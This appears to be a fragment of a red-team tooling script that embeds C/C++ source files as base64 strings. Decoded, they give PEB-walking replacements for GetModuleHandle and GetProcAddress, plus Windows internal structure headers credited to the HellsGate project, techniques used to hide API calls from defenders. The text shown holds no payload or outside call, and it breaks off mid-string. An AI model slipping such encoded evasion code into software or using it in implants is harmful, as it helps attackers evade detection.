	b64_helpers_cpp = "LyoKIFJlZCBUZWFtIE9wZXJhdG9yIGhlbHBlciBmdW5jdGlvbnMKCiBhdXRob3I6IHJlZW56MGggKHR3aXR0ZXI6IEBTRUtUT1I3bmV0KQogY3JlZGl0czogemVyb3N1bTB4MCwgc3BlZWRpMTMKIAoqLwoKI2luY2x1ZGUgIlBFc3RydWN0cy5oIgojaW5jbHVkZSAiaGVscGVycy5oIgojaW5jbHVkZSA8c3RkaW8uaD4KCnR5cGVkZWYgSE1PRFVMRSAoV0lOQVBJICogTG9hZExpYnJhcnlfdCkoTFBDU1RSIGxwRmlsZU5hbWUpOwpMb2FkTGlicmFyeV90IHBMb2FkTGlicmFyeUEgPSBOVUxMOwoKCgpITU9EVUxFIFdJTkFQSSBobHBHZXRNb2R1bGVIYW5kbGUoTFBDV1NUUiBzTW9kdWxlTmFtZSkgewoKCS8vIGdldCB0aGUgb2Zmc2V0IG9mIFByb2Nlc3MgRW52aXJvbm1lbnQgQmxvY2sKI2lmZGVmIF9NX0lYODYgCglQRUIgKiBQcm9jRW52QmxrID0gKFBFQiAqKSBfX3JlYWRmc2R3b3JkKDB4MzApOwojZWxzZQoJUEVCICogUHJvY0VudkJsayA9IChQRUIgKilfX3JlYWRnc3F3b3JkKDB4NjApOwojZW5kaWYKCgkvLyByZXR1cm4gYmFzZSBhZGRyZXNzIG9mIGEgY2FsbGluZyBtb2R1bGUKCWlmIChzTW9kdWxlTmFtZSA9PSBOVUxMKSAKCQlyZXR1cm4gKEhNT0RVTEUpIChQcm9jRW52QmxrLT5JbWFnZUJhc2VBZGRyZXNzKTsKCglQRUJfTERSX0RBVEEgKiBMZHIgPSBQcm9jRW52QmxrLT5MZHI7CglMSVNUX0VOVFJZICogTW9kdWxlTGlzdCA9IE5VTEw7CgkKCU1vZHVsZUxpc3QgPSAmTGRyLT5Jbk1lbW9yeU9yZGVyTW9kdWxlTGlzdDsKCUxJU1RfRU5UUlkgKiAgcFN0YXJ0TGlzdEVudHJ5ID0gTW9kdWxlTGlzdC0+Rmxpbms7CgoJZm9yIChMSVNUX0VOVFJZICogIHBMaXN0RW50cnkgID0gcFN0YXJ0TGlzdEVudHJ5OyAgCQkvLyBzdGFydCBmcm9tIGJlZ2lubmluZyBvZiBJbk1lbW9yeU9yZGVyTW9kdWxlTGlzdAoJCQkJCSAgIHBMaXN0RW50cnkgIT0gTW9kdWxlTGlzdDsJICAgIAkvLyB3YWxrIGFsbCBsaXN0IGVudHJpZXMKCQkJCQkgICBwTGlzdEVudHJ5ICA9IHBMaXN0RW50cnktPkZsaW5rKQl7CgkJCgkJLy8gZ2V0IGN1cnJlbnQgRGF0YSBUYWJsZSBFbnRyeQoJCUxEUl9EQVRBX1RBQkxFX0VOVFJZICogcEVudHJ5ID0gKExEUl9EQVRBX1RBQkxFX0VOVFJZICopICgoQllURSAqKSBwTGlzdEVudHJ5IC0gc2l6ZW9mKExJU1RfRU5UUlkpKTsKCgkJLy8gY2hlY2sgaWYgbW9kdWxlIGlzIGZvdW5kIGFuZCByZXR1cm4gaXRzIGJhc2UgYWRkcmVzcwoJCWlmIChsc3RyY21waVcocEVudHJ5LT5CYXNlRGxsTmFtZS5CdWZmZXIsIHNNb2R1bGVOYW1lKSA9PSAwKQoJCQlyZXR1cm4gKEhNT0RVTEUpIHBFbnRyeS0+RGxsQmFzZTsKCX0KCgkvLyBvdGhlcndpc2U6CglyZXR1cm4gTlVMTDsKCn0KCkZBUlBST0MgV0lOQVBJIGhscEdldFByb2NBZGRyZXNzKEhNT0RVTEUgaE1vZCwgY2hhciAqIHNQcm9jTmFtZSkgewoKCWNoYXIgKiBwQmFzZUFkZHIgPSAoY2hhciAqKSBoTW9kOwoKCS8vIGdldCBwb2ludGVycyB0byBtYWluIGhlYWRlcnMvc3RydWN0dXJlcwoJSU1BR0VfRE9TX0hFQURFUiAqIHBEb3NIZHIgPSAoSU1BR0VfRE9TX0hFQURFUiAqKSBwQmFzZUFkZHI7CglJTUFHRV9OVF9IRUFERVJTICogcE5USGRyID0gKElNQUdFX05UX0hFQURFUlMgKikgKHBCYXNlQWRkciArIHBEb3NIZHItPmVfbGZhbmV3KTsKCUlNQUdFX09QVElPTkFMX0hFQURFUiAqIHBPcHRpb25hbEhkciA9ICZwTlRIZHItPk9wdGlvbmFsSGVhZGVyOwoJSU1BR0VfREFUQV9ESVJFQ1RPUlkgKiBwRXhwb3J0RGF0YURpciA9IChJTUFHRV9EQVRBX0RJUkVDVE9SWSAqKSAoJnBPcHRpb25hbEhkci0+RGF0YURpcmVjdG9yeVtJTUFHRV9ESVJFQ1RPUllfRU5UUllfRVhQT1JUXSk7CglJTUFHRV9FWFBPUlRfRElSRUNUT1JZICogcEV4cG9ydERpckFkZHIgPSAoSU1BR0VfRVhQT1JUX0RJUkVDVE9SWSAqKSAocEJhc2VBZGRyICsgcEV4cG9ydERhdGFEaXItPlZpcnR1YWxBZGRyZXNzKTsKCgkvLyByZXNvbHZlIGFkZHJlc3NlcyB0byBFeHBvcnQgQWRkcmVzcyBUYWJsZSwgdGFibGUgb2YgZnVuY3Rpb24gbmFtZXMgYW5kICJ0YWJsZSBvZiBvcmRpbmFscyIKCURXT1JEICogcEVBVCA9IChEV09SRCAqKSAocEJhc2VBZGRyICsgcEV4cG9ydERpckFkZHItPkFkZHJlc3NPZkZ1bmN0aW9ucyk7CglEV09SRCAqIHBGdW5jTmFtZVRibCA9IChEV09SRCAqKSAocEJhc2VBZGRyICsgcEV4cG9ydERpckFkZHItPkFkZHJlc3NPZk5hbWVzKTsKCVdPUkQgKiBwSGludHNUYmwgPSAoV09SRCAqKSAocEJhc2VBZGRyICsgcEV4cG9ydERpckFkZHItPkFkZHJlc3NPZk5hbWVPcmRpbmFscyk7CgoJLy8gZnVuY3Rpb24gYWRkcmVzcyB3ZSdyZSBsb29raW5nIGZvcgoJdm9pZCAqcFByb2NBZGRyID0gTlVMTDsKCgkvLyByZXNvbHZlIGZ1bmN0aW9uIGJ5IG9yZGluYWwKCWlmICgoKERXT1JEX1BUUilzUHJvY05hbWUgPj4gMTYpID09IDApIHsKCQlXT1JEIG9yZGluYWwgPSAoV09SRCkgc1Byb2NOYW1lICYgMHhGRkZGOwkvLyBjb252ZXJ0IHRvIFdPUkQKCQlEV09SRCBCYXNlID0gcEV4cG9ydERpckFkZHItPkJhc2U7CQkJLy8gZmlyc3Qgb3JkaW5hbCBudW1iZXIKCgkJLy8gY2hlY2sgaWYgb3JkaW5hbCBpcyBub3Qgb3V0IG9mIHNjb3BlCgkJaWYgKG9yZGluYWwgPCBCYXNlIHx8IG9yZGluYWwgPj0gQmFzZSArIHBFeHBvcnREaXJBZGRyLT5OdW1iZXJPZkZ1bmN0aW9ucykKCQkJcmV0dXJuIE5VTEw7CgoJCS8vIGdldCB0aGUgZnVuY3Rpb24gdmlydHVhbCBhZGRyZXNzID0gUlZBICsgQmFzZUFkZHIKCQlwUHJvY0FkZHIgPSAoRkFSUFJPQykgKHBCYXNlQWRkciArIChEV09SRF9QVFIpIHBFQVRbb3JkaW5hbCAtIEJhc2VdKTsKCX0KCS8vIHJlc29sdmUgZnVuY3Rpb24gYnkgbmFtZQoJZWxzZSB7CgkJLy8gcGFyc2UgdGhyb3VnaCB0YWJsZSBvZiBmdW5jdGlvbiBuYW1lcwoJCWZvciAoRFdPUkQgaSA9IDA7IGkgPCBwRXhwb3J0RGlyQWRkci0+TnVtYmVyT2ZOYW1lczsgaSsrKSB7CgkJCWNoYXIgKiBzVG1wRnVuY05hbWUgPSAoY2hhciAqKSBwQmFzZUFkZHIgKyAoRFdPUkRfUFRSKSBwRnVuY05hbWVUYmxbaV07CgkKCQkJaWYgKHN0cmNtcChzUHJvY05hbWUsIHNUbXBGdW5jTmFtZSkgPT0gMCkJewoJCQkJLy8gZm91bmQsIGdldCB0aGUgZnVuY3Rpb24gdmlydHVhbCBhZGRyZXNzID0gUlZBICsgQmFzZUFkZHIKCQkJCXBQcm9jQWRkciA9IChGQVJQUk9DKSAocEJhc2VBZGRyICsgKERXT1JEX1BUUikgcEVBVFtwSGludHNUYmxbaV1dKTsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJfQoKCS8vIGNoZWNrIGlmIGZvdW5kIFZBIGlzIGZvcndhcmRlZCB0byBleHRlcm5hbCBsaWJyYXJ5LmZ1bmN0aW9uCglpZiAoKGNoYXIgKikgcFByb2NBZGRyID49IChjaGFyICopIHBFeHBvcnREaXJBZGRyICYmIAoJCShjaGFyICopIHBQcm9jQWRkciA8IChjaGFyICopIChwRXhwb3J0RGlyQWRkciArIHBFeHBvcnREYXRhRGlyLT5TaXplKSkgewoJCQoJCWNoYXIgKiBzRndkRExMID0gX3N0cmR1cCgoY2hhciAqKSBwUHJvY0FkZHIpOyAJLy8gZ2V0IGEgY29weSBvZiBsaWJyYXJ5LmZ1bmN0aW9uIHN0cmluZwoJCWlmICghc0Z3ZERMTCkgcmV0dXJuIE5VTEw7CgoJCS8vIGdldCBleHRlcm5hbCBmdW5jdGlvbiBuYW1lCgkJY2hhciAqIHNGd2RGdW5jdGlvbiA9IHN0cmNocihzRndkRExMLCAnLicpOwoJCSpzRndkRnVuY3Rpb24gPSAwOwkJCQkJLy8gc2V0IHRyYWlsaW5nIG51bGwgYnl0ZSBmb3IgZXh0ZXJuYWwgbGlicmFyeSBuYW1lIC0+IGxpYnJhcnlceDBmdW5jdGlvbgoJCXNGd2RGdW5jdGlvbisrOwkJCQkJCS8vIHNoaWZ0IGEgcG9pbnRlciB0byB0aGUgYmVnaW5uaW5nIG9mIGZ1bmN0aW9uIG5hbWUKCgkJLy8gcmVzb2x2ZSBMb2FkTGlicmFyeSBmdW5jdGlvbiBwb2ludGVyLCBrZWVwIGl0IGFzIGdsb2JhbCB2YXJpYWJsZQoJCWlmIChwTG9hZExpYnJhcnlBID09IE5VTEwpIHsKCQkJcExvYWRMaWJyYXJ5QSA9IChMb2FkTGlicmFyeV90KSBobHBHZXRQcm9jQWRkcmVzcyhobHBHZXRNb2R1bGVIYW5kbGUoTCJLRVJORUwzMi5ETEwiKSwgIkxvYWRMaWJyYXJ5QSIpOwoJCQlpZiAocExvYWRMaWJyYXJ5QSA9PSBOVUxMKSByZXR1cm4gTlVMTDsKCQl9CgoJCS8vIGxvYWQgdGhlIGV4dGVybmFsIGxpYnJhcnkKCQlITU9EVUxFIGhGd2QgPSBwTG9hZExpYnJhcnlBKHNGd2RETEwpOwoJCWZyZWUoc0Z3ZERMTCk7CQkJCQkJCS8vIHJlbGVhc2UgdGhlIGFsbG9jYXRlZCBtZW1vcnkgZm9yIGxpYi5mdW5jIHN0cmluZyBjb3B5CgkJaWYgKCFoRndkKSByZXR1cm4gTlVMTDsKCgkJLy8gZ2V0IHRoZSBhZGRyZXNzIG9mIGZ1bmN0aW9uIHRoZSBvcmlnaW5hbCBjYWxsIGlzIGZvcndhcmRlZCB0bwoJCXBQcm9jQWRkciA9IGhscEdldFByb2NBZGRyZXNzKGhGd2QsIHNGd2RGdW5jdGlvbik7Cgl9CgoJcmV0dXJuIChGQVJQUk9DKSBwUHJvY0FkZHI7Cn0="
	b64_helpers_h = "I3ByYWdtYSBvbmNlCgojaW5jbHVkZSA8d2luZG93cy5oPgojaW5jbHVkZSA8bWFsbG9jLmg+CgpITU9EVUxFIFdJTkFQSSBobHBHZXRNb2R1bGVIYW5kbGUoTFBDV1NUUiBzTW9kdWxlTmFtZSk7CkZBUlBST0MgV0lOQVBJIGhscEdldFByb2NBZGRyZXNzKEhNT0RVTEUgaE1vZCwgY2hhciAqIHNQcm9jTmFtZSk7"
	b64_pestructs_h = "I3ByYWdtYSBvbmNlCgojaW5jbHVkZSA8d2luZG93cy5oPgoKLy9odHRwczovL3Byb2Nlc3NoYWNrZXIuc291cmNlZm9yZ2UuaW8vZG9jL250cHNhcGlfOGhfc291cmNlLmh0bWwjbDAwMDYzCnN0cnVjdCBQRUJfTERSX0RBVEEKewoJVUxPTkcgTGVuZ3RoOwoJQk9PTEVBTiBJbml0aWFsaXplZDsKCUhBTkRMRSBTc0hhbmRsZTsKCUxJU1RfRU5UUlkgSW5Mb2FkT3JkZXJNb2R1bGVMaXN0OwoJTElTVF9FTlRSWSBJbk1lbW9yeU9yZGVyTW9kdWxlTGlzdDsKCUxJU1RfRU5UUlkgSW5Jbml0aWFsaXphdGlvbk9yZGVyTW9kdWxlTGlzdDsKCVBWT0lEIEVudHJ5SW5Qcm9ncmVzczsKCUJPT0xFQU4gU2h1dGRvd25JblByb2dyZXNzOwoJSEFORExFIFNodXRkb3duVGhyZWFkSWQ7Cn07Ci8vaHR0cHM6Ly9wcm9jZXNzaGFja2VyLnNvdXJjZWZvcmdlLmlvL2RvYy9udHBlYnRlYl84aF9zb3VyY2UuaHRtbCNsMDAwMDgKc3RydWN0IFBFQgp7CglCT09MRUFOIEluaGVyaXRlZEFkZHJlc3NTcGFjZTsKCUJPT0xFQU4gUmVhZEltYWdlRmlsZUV4ZWNPcHRpb25zOwoJQk9PTEVBTiBCZWluZ0RlYnVnZ2VkOwoJdW5pb24KCXsKCQlCT09MRUFOIEJpdEZpZWxkOwoJCXN0cnVjdAoJCXsKCQkJQk9PTEVBTiBJbWFnZVVzZXNMYXJnZVBhZ2VzIDogMTsKCQkJQk9PTEVBTiBJc1Byb3RlY3RlZFByb2Nlc3MgOiAxOwoJCQlCT09MRUFOIElzSW1hZ2VEeW5hbWljYWxseVJlbG9jYXRlZCA6IDE7CgkJCUJPT0xFQU4gU2tpcFBhdGNoaW5nVXNlcjMyRm9yd2FyZGVycyA6IDE7CgkJCUJPT0xFQU4gSXNQYWNrYWdlZFByb2Nlc3MgOiAxOwoJCQlCT09MRUFOIElzQXBwQ29udGFpbmVyIDogMTsKCQkJQk9PTEVBTiBJc1Byb3RlY3RlZFByb2Nlc3NMaWdodCA6IDE7CgkJCUJPT0xFQU4gU3BhcmVCaXRzIDogMTsKCQl9OwoJfTsKCUhBTkRMRSBNdXRhbnQ7CglQVk9JRCBJbWFnZUJhc2VBZGRyZXNzOwoJUEVCX0xEUl9EQVRBKiBMZHI7CgkvLy4uLgp9OwoKc3RydWN0IFVOSUNPREVfU1RSSU5HCnsKCVVTSE9SVCBMZW5ndGg7CglVU0hPUlQgTWF4aW11bUxlbmd0aDsKCVBXQ0ggQnVmZmVyOwp9OwoJCi8vaHR0cHM6Ly9wcm9jZXNzaGFja2VyLnNvdXJjZWZvcmdlLmlvL2RvYy9udGxkcl84aF9zb3VyY2UuaHRtbCNsMDAxMDIKc3RydWN0IExEUl9EQVRBX1RBQkxFX0VOVFJZCnsKCUxJU1RfRU5UUlkgSW5Mb2FkT3JkZXJMaW5rczsKCUxJU1RfRU5UUlkgSW5NZW1vcnlPcmRlckxpbmtzOwoJdW5pb24KCXsKCQlMSVNUX0VOVFJZIEluSW5pdGlhbGl6YXRpb25PcmRlckxpbmtzOwoJCUxJU1RfRU5UUlkgSW5Qcm9ncmVzc0xpbmtzOwoJfTsKCVBWT0lEIERsbEJhc2U7CglQVk9JRCBFbnRyeVBvaW50OwoJVUxPTkcgU2l6ZU9mSW1hZ2U7CglVTklDT0RFX1NUUklORyBGdWxsRGxsTmFtZTsKCVVOSUNPREVfU1RSSU5HIEJhc2VEbGxOYW1lOwoJLy8uLi4KfTs="
	b64_structs_h = "I3ByYWdtYSBvbmNlCgojaW5jbHVkZSA8V2luZG93cy5oPgoKCi8vTW9zdCBvZiB0aGlzIGNvbWVzIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL2FtMG5zZWMvSGVsbHNHYXRlL2Jsb2IvbWFzdGVyL0hlbGxzR2F0ZS9zdHJ1Y3RzLmgKCgp0eXBlZGVmIHN0cnVjdCBfQ0xJRU5UX0lECnsKCVBWT0lEIFVuaXF1ZVByb2Nlc3M7CglQVk9JRCBVbmlxdWVUaHJlYWQ7Cn0gQ0xJRU5UX0lELCAqIFBDTElFTlRfSUQ7Cgp0eXBlZGVmIHN0cnVjdCBfTFNBX1VOSUNPREVfU1RSSU5HIHsKCVVTSE9SVCBMZW5ndGg7CglVU0hPUlQgTWF4aW11bUxlbmd0aDsKCVBXU1RSICBCdWZmZXI7Cn0gTFNBX1VOSUNPREVfU1RSSU5HLCAqIFBMU0FfVU5JQ09ERV9TVFJJTkcsIFVOSUNPREVfU1RSSU5HLCAqIFBVTklDT0RFX1NUUklORywgKiBQVU5JQ09ERV9TVFI7Cgp0eXBlZGVmIHN0cnVjdCBfTERSX01PRFVMRSB7CglMSVNUX0VOVFJZICAgICAgICAgICAgICBJbkxvYWRPcmRlck1vZHVsZUxpc3Q7CglMSVNUX0VOVFJZICAgICAgICAgICAgICBJbk1lbW9yeU9yZGVyTW9kdWxlTGlzdDsKCUxJU1RfRU5UUlkgICAgICAgICAgICAgIEluSW5pdGlhbGl6YXRpb25PcmRlck1vZHVsZUxpc3Q7CglQVk9JRCAgICAgICAgICAgICAgICAgICBCYXNlQWRkcmVzczsKCVBWT0lEICAgICAgICAgICAgICAgICAgIEVudHJ5UG9pbnQ7CglVTE9ORyAgICAgICAgICAgICAgICAgICBTaXplT2ZJbWFnZTsKCVVOSUNPREVfU1RSSU5HICAgICAgICAgIEZ1bGxEbGxOYW1lOwoJVU5JQ09ERV9TVFJJTkcgICAgICAgICAgQmFzZURsbE5hbWU7CglVTE9ORyAgICAgICAgICAgICAgICAgICBGbGFnczsKCVNIT1JUICAgICAgICAgICAgICAgICAgIExvYWRDb3VudDsKCVNIT1JUICAgICAgICAgICAgICAgICAgIFRsc0luZGV4OwoJTElTVF9FTlRSWSAgICAgICAgICAgICAgSGFzaFRhYmxlRW50cnk7CglVTE9ORyAgICAgICAgICAgICAgICAgICBUaW1lRGF0ZVN0YW1wOwp9IExEUl9NT0RVTEUsICogUExEUl9NT0RVTEU7Cgp0eXBlZGVmIHN0cnVjdCBfUEVCX0xEUl9EQVRBIHsKCVVMT05HICAgICAgICAgICAgICAgICAgIExlbmd0aDsKCVVMT05HICAgICAgICAgICAgICAgICAgIEluaXRpYWxpemVkOwoJUFZPSUQgICAgICAgICAgICAgICAgICAgU3NIYW5kbGU7CglMSVNUX0VOVFJZICAgICAgICAgICAgICBJbkxvYWRPcmRlck1vZHVsZUxpc3Q7CglMSVNUX0VOVFJZICAgICAgICAgICAgICBJbk1lbW9yeU9yZGVyTW9kdWxlTGlzdDsKCUxJU1RfRU5UUlkgICAgICAgICAgICAgIEluSW5pdGlhbGl6YXRpb25PcmRlck1vZHVsZUxpc3Q7Cn0gUEVCX0xEUl9EQVRBLCAqIFBQRUJfTERSX0RBVEE7Cgp0eXBlZGVmIHN0cnVjdCBfUEVCIHsKCUJPT0xFQU4gICAgICAgICAgICAgICAgIEluaGVyaXRlZEFkZHJlc3NTcGFjZTsKCUJPT0xFQU4gICAgICAgICAgICAgICAgIFJlYWRJbWFnZUZpbGVFeGVjT3B0aW9uczsKCUJPT0xFQU4gICAgICAgICAgICAgICAgIEJlaW5nRGVidWdnZWQ7CglCT09MRUFOICAgICAgICAgICAgICAgICBTcGFyZTsKCUhBTkRMRSAgICAgICAgICAgICAgICAgIE11dGFudDsKCVBWT0lEICAgICAgICAgICAgICAgICAgIEltYWdlQmFzZTsKCVBQRUJfTERSX0RBVEEgICAgICAgICAgIExvYWRlckRhdGE7CglQVk9JRCAgICAgICAgICAgICAgICAgICBQcm9jZXNzUGFyYW1ldGVyczsKCVBWT0lEICAgICAgICAgICAgICAgICAgIFN1YlN5c3RlbURhdGE7CglQVk9JRCAgICAgICAgICAgICAgICAgICBQcm9jZXNzSGVhcDsKCVBWT0lEICAgICAgICAgICAgICAgICAgIEZhc3RQZWJMb2NrOwoJUFZPSUQgICAgICAgICAgICAgICAgICAgRmFzdFBlYkxvY2tSb3V0aW5lOwoJUFZPSUQgICAgICAgICAgICAgICAgICAgRmFzdFBlYlVubG9ja1JvdXRpbmU7CglVTE9ORyAgICAgICAgICAgICAgICAgICBFbnZpcm9ubWVudFVwZGF0ZUNvdW50OwoJUFZPSUQqIEtlcm5lbENhbGxiYWNrVGFibGU7CglQVk9JRCAgICAgICAgICAgICAgICAgICBFdmVudExvZ1NlY3Rpb247CglQVk9JRCAgICAgICAgICAgICAgICAgICBFdmVudExvZzsKCVBWT0lEICAgICAgICAgICAgICAgICAgIEZyZWVMaXN0OwoJVUxPTkcgICAgICAgICAgICAgICAgICAgVGxzRXhwYW5zaW9uQ291bnRlcjsKCVBWT0lEICAgICAgICAgICAgICAgICAgIFRsc0JpdG1hcDsKCVVMT05HICAgICAgICAgICAgICAgICAgIFRsc0JpdG1hcEJpdHNbMHgyXTsKCVBWT0lEICAgICAgICAgICAgICAgICAgIFJlYWRPbmx5U2hhcmVkTWVtb3J5QmFzZTsKCVBWT0lEICAgICAgICAgICAgICAgICAgIFJlYWRPbmx5U2hhcmVkTWVtb3J5SGVhcDsKCVBWT0lEKiBSZWFkT25seVN0YXRpY1NlcnZlckRhdGE7CglQVk9JRCAgICAgICAgICAgICAgICAgICBBbnNpQ29kZVBhZ2VEYXRhOwoJUFZPSUQgICAgICAgICAgICAgICAgICAgT2VtQ29kZVBhZ2VEYXRhOwoJUFZPSUQgICAgICAgICAgICAgICAgICAgVW5pY29kZUNhc2VUYWJsZURhdGE7CglVTE9ORyAgICAgICAgICAgICAgICAgICBOdW1iZXJPZlByb2Nlc3NvcnM7CglVTE9ORyAgICAgICAgICAgICAgICAgICBOdEdsb2JhbEZsYWc7CglCWVRFICAgICAgICAgICAgICAgICAgICBTcGFyZTJbMHg0XTsKCUxBUkdFX0lOVEVHRVIgICAgICAgICAgIENyaXRpY2FsU2VjdGlvblRpbWVvdXQ7CglVTE9ORyAgICAgICAgICAgICAgICAgICBIZWFwU2VnbWVudFJlc2VydmU7CglVTE9ORyAgICAgICAgICAgICAgICAgICBIZWFwU2VnbWVudENvbW1pdDsKCVVMT05HICAgICAgICAgICAgICAgICAgIEhlYXBEZUNvbW1pdFRvdGFsRnJlZVRocmVzaG9sZDsKCVVMT05HICAgICAgICAgICAgICAgICAgIEhlYXBEZUNvbW1pdEZyZWVCbG9ja1RocmVzaG9sZDsKCVVMT05HICAgICAgICAgICAgICAgICAgIE51bWJlck9mSGVhcHM7CglVTE9ORyAgICAgICAgICAgICAgICAgICBNYXhpbXVtTnVtYmVyT2ZIZWFwczsKCVBWT0lEKiogUHJvY2Vzc0hlYXBzOwoJUFZPSUQgICAgICAgICAgICAgICAgICAgR2RpU2hhcmVkSGFuZGxlVGFibGU7CglQVk9JRCAgICAgICAgICAgICAgICAgICBQcm9jZXNzU3RhcnRlckhlbHBlcjsKCVBWT0lEICAgICAgICAgICAgICAgICAgIEdkaURDQXR0cmlidXRlTGlzdDsKCVBWT0lEICAgICAgICAgICAgICAgICAgIExvYWRlckxvY2s7CglVTE9ORyAgICAgICAgICAgICAgICAgICBPU01ham9yVmVyc2lvbjsKCVVMT05HICAgICAgICAgICAgICAgICAgIE9TTWlub3JWZXJzaW9uOwoJVUxPTkcgICAgICAgICAgICAgICAgICAgT1NCdWlsZE51bWJlcjsKCVVMT05HICAgICAgICAgICAgICAgICAgIE9TUGxhdGZvcm1JZDsKCVVMT05HICAgICAgICAgICAgICAgICAgIEltYWdlU3ViU3lzdGVtOwoJVUxPTkcgICAgICAgICAgICAgICAgICAgSW1hZ2VTdWJTeXN0ZW1NYWpvclZlcnNpb247CglVTE9ORyAgICAgICAgICAgICAgICAgICBJbWFnZVN1YlN5c3RlbU1pbm9yVmVyc2lvbjsKCVVMT05HICAgICAgICAgICAgICAgICAgIEdkaUhhbmRsZUJ1ZmZlclsweDIyXTsKCVVMT05HICAgICAgICAgICAgICAgICAgIFBvc3RQcm9jZXNzSW5pdFJvdXRpbmU7CglVTE9ORyAgICAgICAgICAgICAgICAgICBUbHNFeHBhbnNpb25CaXRtYXA7CglCWVRFICAgICAgICAgICAgICAgICAgICBUbHNFeHBhbnNpb25CaXRtYXBCaXRzWzB4ODBdOwoJVUxPTkcgICAgICAgICAgICAgICAgICAgU2Vzc2lvbklkOwp9IFBFQiwgKiBQUEVCOwoKCnR5cGVkZWYgc3RydWN0IF9URUJfQUNUSVZFX0ZSQU1FX0NPTlRFWFQgewoJVUxPTkcgRmxhZ3M7CglQQ0hBUiBGcmFtZU5hbWU7Cn0gVEVCX0FDVElWRV9GUkFNRV9DT05URVhULCAqIFBURUJfQUNUSVZFX0ZSQU1FX0NPTlRFWFQ7Cgp0eXBlZGVmIHN0cnVjdCBfVEVCX0FDVElWRV9GUkFNRSB7CglVTE9ORyBGbGFnczsKCXN0cnVjdCBfVEVCX0FDVElWRV9GUkFNRSogUHJldmlvdXM7CglQVEVCX0FDVElWRV9GUkFNRV9DT05URVhUIENvbnRleHQ7Cn0gVEVCX0FDVElWRV9GUkFNRSwgKiBQVEVCX0FDVElWRV9GUkFNRTsKCnR5cGVkZWYgc3RydWN0IF9HRElfVEVCX0JBVENIIHsKCVVMT05HIE9mZnNldDsKCVVMT05HIEhEQzsKCVVMT05HIEJ1ZmZlclszMTBdOwp9IEdESV9URUJfQkFUQ0gsICogUEdESV9URUJfQkFUQ0g7Cgp0eXBlZGVmIFBWT0lEIFBBQ1RJVkFUSU9OX0NPTlRFWFQ7Cgp0eXBlZGVmIHN0cnVjdCBfUlRMX0FDVElWQVRJT05fQ09OVEVYVF9TVEFDS19GUkFNRSB7CglzdHJ1Y3QgX19SVExfQUNUSVZBVElPTl9DT05URVhUX1NUQUNLX0ZSQU1FKiBQcmV2aW91czsKCVBBQ1RJVkFUSU9OX0NPTlRFWFQgQWN0aXZhdGlvbkNvbnRleHQ7CglVTE9ORyBGbGFnczsKfSBSVExfQUNUSVZBVElPTl9DT05URVhUX1NUQUNLX0ZSQU1FLCAqIFBSVExfQUNUSVZBVElPTl9DT05URVhUX1NUQUNLX0ZSQU1FOwoKdHlwZWRlZiBzdHJ1Y3QgX0FDVElWQVRJT05fQ09OVEVYVF9TVEFDSyB7CglQUlRMX0FDVElWQVRJT05fQ09OVEVYVF9TVEFDS19GUkFNRSBBY3RpdmVGcmFtZTsKCUxJU1RfRU5UUlkgRnJhbWVMaXN0Q2FjaGU7CglVTE9ORyBGbGFnczsKCVVMT05HIE5leHRDb29raWVTZXF1ZW5jZU51bWJlcjsKCVVMT05HIFN0YWNrSWQ7Cn0gQUNUSVZBVElPTl9DT05URVhUX1NUQUNLLCAqIFBBQ1RJVkFUSU9OX0NPTlRFWFRfU1RBQ0s7Cgp0eXBlZGVmIHN0cnVjdCBfVEVCIHsKCU5UX1RJQgkJCQlOdFRpYjsKCVBWT0lECQkJCUVudmlyb25tZW50UG9pbnRlcjsKCUNMSUVOVF9JRAkJCUNsaWVudElkOwoJUFZPSUQJCQkJQWN0aXZlUnBjSGFuZGxlOwoJUFZPSUQJCQkJVGhyZWFkTG9jYWxTdG9yYWdlUG9pbnRlcjsKCVBQRUIJCQkJUHJvY2Vzc0Vudmlyb25tZW50QmxvY2s7CglVTE9ORyAgICAgICAgICAgICAgIExhc3RFcnJvclZhbHVlOwoJVUxPTkcgICAgICAgICAgICAgICBDb3VudE9mT3duZWRDcml0aWNhbFNlY3Rpb25zOwoJUFZPSUQJCQkJQ3NyQ2xpZW50VGhyZWFkOwoJUFZPSUQJCQkJV2luMzJUaHJlYWRJbmZvOwoJVUxPTkcgICAgICAgICAgICAgICBVc2VyMzJSZXNlcnZlZFsyNl07CglVTE9ORyAgICAgICAgICAgICAgIFVzZXJSZXNlcnZlZFs1XTsKCVBWT0lECQkJCVdPVzMyUmVzZXJ2ZWQ7CglMQ0lEICAgICAgICAgICAgICAgIEN1cnJlbnRMb2NhbGU7CglVTE9ORyAgICAgICAgICAgICAgIEZwU29mdHdhcmVTdGF0dXNSZWdpc3RlcjsKCVBWT0lECQkJCVN5c3RlbVJlc2VydmVkMVs1NF07CglMT05HICAgICAgICAgICAgICAgIEV4Y2VwdGlvbkNvZGU7CiNpZiAoTlRERElfVkVSU0lPTiA+PSBOVERESV9MT05HSE9STikKCVBBQ1RJVkFUSU9OX0NPTlRFWFRfU1RBQ0sqIEFjdGl2YXRpb25Db250ZXh0U3RhY2tQb2ludGVyOwoJVUNIQVIgICAgICAgICAgICAgICAgICBTcGFyZUJ5dGVzMVsweDMwIC0gMyAqIHNpemVvZihQVk9JRCldOwoJVUxPTkcgICAgICAgICAgICAgICAgICBUeEZzQ29udGV4dDsKI2VsaWYgKE5URERJX1ZFUlNJT04gPj0gTlRERElfV1MwMykKCVBBQ1RJVkFUSU9OX0NPTlRFWFRfU1RBQ0sgQWN0aXZhdGlvbkNvbnRleHRTdGFja1BvaW50ZXI7CglVQ0hBUiAgICAgICAgICAgICAgICAgIFNwYXJlQnl0ZXMxWzB4MzQgLSAzICogc2l6ZW9mKFBWT0lEKV07CiNlbHNlCglBQ1RJVkFUSU9OX0NPTlRFWFRfU1RBQ0sgQWN0aXZhdGlvbkNvbnRleHRTdGFjazsKCVVDSEFSICAgICAgICAgICAgICAgICAgU3BhcmVCeXRlczFbMjRdOwojZW5kaWYKCUdESV9URUJfQkFUQ0gJCQlHZGlUZWJCYXRjaDsKCUNMSUVOVF9JRAkJCQlSZWFsQ2xpZW50SWQ7CglQVk9JRAkJCQkJR2RpQ2FjaGVkUHJvY2Vzc0hhbmRsZTsKCVVMT05HICAgICAgICAgICAgICAgICAgIEdkaUNsaWVudFBJRDsKCVVMT05HICAgICAgICAgICAgICAgICAgIEdkaUNsaWVudFRJRDsKCVBWT0lECQkJCQlHZGlUaHJlYWRMb2NhbEluZm87CglQU0laRV9UCQkJCQlXaW4zMkNsaWVudEluZm9bNjJdOwoJUFZPSUQJCQkJCWdsRGlzcGF0Y2hUYWJsZVsyMzNdOwoJUFN